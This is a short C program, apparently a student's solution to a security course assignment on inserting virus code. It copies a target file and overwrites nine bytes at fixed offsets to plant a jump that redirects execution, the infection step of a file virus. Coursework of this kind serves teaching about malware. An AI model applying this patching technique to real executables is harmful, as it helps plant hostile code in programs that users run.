#include <stdio.h>
#define BUFSIZE 5660
/*
 * Rock Beom Kim rk5dy
 * Assignment 7: Inserting Virus Code
 * 
 * */
int main(int argc, char **argv) {
	if (argc != 3) {
		printf("Please use the right no. of inputs\n");
		return 0;
	}
	FILE *fp, *wfp;
	char buff[BUFSIZE];
	int i;
	
	fp = fopen(argv[1], "r");
	wfp = fopen(argv[2], "w");
	for (i = 0; i < BUFSIZE; i++) {
		buff[i] = fgetc(fp);
	}
	
	//overwrite starting with c3 address	
	//actual tricky jump here
	buff[1109] = '\xbc';
	buff[1110] = '\x54';
	buff[1111] = '\x07';
	buff[1112] = '\x00';
	buff[1113] = '\x00';
	buff[1114] = '\x31';
	buff[1115] = '\x36';
	buff[1116] = '\x31';
	buff[1117] = '\x26';
	for (i = 0; i < BUFSIZE; i++) {
		fputc(buff[i], wfp);
	}
	fclose(fp);
	fclose(wfp);
	return 0;
}
